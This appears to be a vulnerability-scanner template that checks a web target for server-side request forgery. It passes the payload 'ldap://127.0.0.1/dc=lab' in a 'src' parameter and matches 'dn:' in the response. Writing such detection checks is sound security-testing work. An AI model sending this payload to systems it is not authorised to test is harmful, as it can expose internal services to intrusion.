id: ssrf4-18
name: 'SSRF scheme ldap via src'
severity: high
type: active
tags:
  - ssrf
  - oob
  - scheme
description: 'Fetches ldap URL via src (verify manually)'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      src:
        - 'ldap://127.0.0.1/dc=lab'
    matchers:
      - type: word
        part: body
        words:
          - 'dn:'
